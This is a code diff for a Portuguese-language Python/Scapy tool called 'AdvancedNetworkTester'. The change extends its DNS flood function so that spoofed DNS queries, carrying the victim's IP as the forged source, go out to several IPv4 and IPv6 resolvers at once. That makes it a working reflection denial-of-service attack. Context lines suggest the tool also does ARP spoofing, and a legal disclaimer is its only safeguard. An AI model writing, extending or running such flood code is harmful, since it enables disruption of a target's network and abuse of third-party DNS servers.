@@ -21,7 +21,7 @@ def dict_to_xml(tag, d):
     return ''.join(parts)
 
 class AdvancedNetworkTester:
-    def __init__(self, target_ip, gateway_ipv4, gateway_ipv6, duration, dns_ipv4="8.8.8.8", dns_ipv6="2001:4860:4860::8888"):
+    def __init__(self, target_ip, gateway_ipv4, gateway_ipv6, duration, dns_ipv4=["8.8.8.8"], dns_ipv6=["2001:4860:4860::8888"]):
         self.target_ip = target_ip
         self.gateway_ipv4 = gateway_ipv4
         self.gateway_ipv6 = gateway_ipv6
@@ -88,40 +88,43 @@ class AdvancedNetworkTester:
     def dns_flood(self):
         self._log_event('DNS_START', 'Iniciando DNS flood')
         while self.running:
-            try:
-                send(
-                    IP(dst=self.dns_ipv4, src=self.target_ip) /
-                    UDP(dport=53) /
-                    DNS(
-                        rd=1,
-                        qd=DNSQR(qname=random.choice([ "google.com", "youtube.com", "facebook.com", "instagram.com", "twitter.com"]))
-                    ),
-                    verbose=0
-                )
-                self.stats['dns_packets_sent'] += 1
-                time.sleep(0.01)
-            except Exception as e:
-                self.stats['errors'] += 1
-                self._log_event('DNS_ERROR', str(e))
-                time.sleep(0.1)
-        
-        while self.running and self.dns_ipv6:
-            try:
-                send(
-                    IPv6(dst=self.dns_ipv6, src=self.target_ip) /
-                    UDP(dport=53) /
-                    DNS(
-                        rd=1,
-                        qd=DNSQR(qname=random.choice([ "google.com", "youtube.com", "facebook.com", "instagram.com", "twitter.com"]))
-                    ),
-                    verbose=0
-                )
-                self.stats['dns_packets_sent'] += 1
-                time.sleep(0.01)
-            except Exception as e:
-                self.stats['errors'] += 1
-                self._log_event('DNS_ERROR', str(e))
-                time.sleep(0.1)
+            # Target all IPv4 DNS servers
+            for dns in self.dns_ipv4:
+                try:
+                    send(
+                        IP(dst=dns, src=self.target_ip) /
+                        UDP(dport=53) /
+                        DNS(
+                            rd=1,
+                            qd=DNSQR(qname=random.choice([ "google.com", "youtube.com", "facebook.com", "instagram.com", "twitter.com"]))
+                        ),
+                        verbose=0
+                    )
+                    self.stats['dns_packets_sent'] += 1
+                    time.sleep(0.01)
+                except Exception as e:
+                    self.stats['errors'] += 1
+                    self._log_event('DNS_ERROR', str(e))
+                    time.sleep(0.1)
+
+            # Target all IPv6 DNS servers
+            for dns in self.dns_ipv6:
+                try:
+                    send(
+                        IPv6(dst=dns, src=self.target_ip) /
+                        UDP(dport=53) /
+                        DNS(
+                            rd=1,
+                            qd=DNSQR(qname=random.choice([ "google.com", "youtube.com", "facebook.com", "instagram.com", "twitter.com"]))
+                        ),
+                        verbose=0
+                    )
+                    self.stats['dns_packets_sent'] += 1
+                    time.sleep(0.01)
+                except Exception as e:
+                    self.stats['errors'] += 1
+                    self._log_event('DNS_ERROR', str(e))
+                    time.sleep(0.1)
 
     def restore_network(self):
         self._log_event('RESTORE', 'Restaurando tabelas ARP')
@@ -144,8 +147,8 @@ class AdvancedNetworkTester:
         print(f"   • Alvo: {self.target_ip}")
         print(f"   • Gateway IPv4: {self.gateway_ipv4}")
         print(f"   • Gateway IPv6: {self.gateway_ipv6}")
-        print(f"   • DNS IPv4: {self.dns_ipv4}")
-        print(f"   • DNS IPv6: {self.dns_ipv6}")
+        print(f"   • DNS IPv4: {', '.join(self.dns_ipv4)}")
+        print(f"   • DNS IPv6: {', '.join(self.dns_ipv6)}")
         print(f"   • Duração: {self.attack_duration}s")
         print(f"   • Log File: {self.log_file}\n")
         
@@ -202,8 +205,14 @@ def main():
     target = get_user_input("Digite o endereço IP do alvo")
     gateway_ipv4 = get_user_input("Digite o endereço IPv4 do gateway (deixe em branco para não usar IPv4)", "")
     gateway_ipv6 = get_user_input("Digite o endereço IPv6 do gateway (deixe em branco para não usar IPv6)", "")
-    dns_ipv4 = get_user_input("Digite o servidor DNS IPv4 (deixe em branco para usar o padrão: 8.8.8.8)", "8.8.8.8")
-    dns_ipv6 = get_user_input("Digite o servidor DNS IPv6 (deixe em branco para usar o padrão: 2001:4860:4860::8888)", "2001:4860:4860::8888")
+    
+    # DNS lists
+    dns_ipv4_input = get_user_input("Digite os servidores DNS IPv4 separados por vírgula (deixe em branco para usar o padrão: 8.8.8.8)", "8.8.8.8")
+    dns_ipv4 = dns_ipv4_input.split(",") if dns_ipv4_input else ["8.8.8.8"]
+    
+    dns_ipv6_input = get_user_input("Digite os servidores DNS IPv6 separados por vírgula (deixe em branco para usar o padrão: 2001:4860:4860::8888)", "2001:4860:4860::8888")
+    dns_ipv6 = dns_ipv6_input.split(",") if dns_ipv6_input else ["2001:4860:4860::8888"]
+    
     duration = int(get_user_input("Digite a duração do teste em segundos", "60"))
 
     print("\n⚠️ AVISO LEGAL: Use apenas em redes próprias ou com autorização explícita!\n")
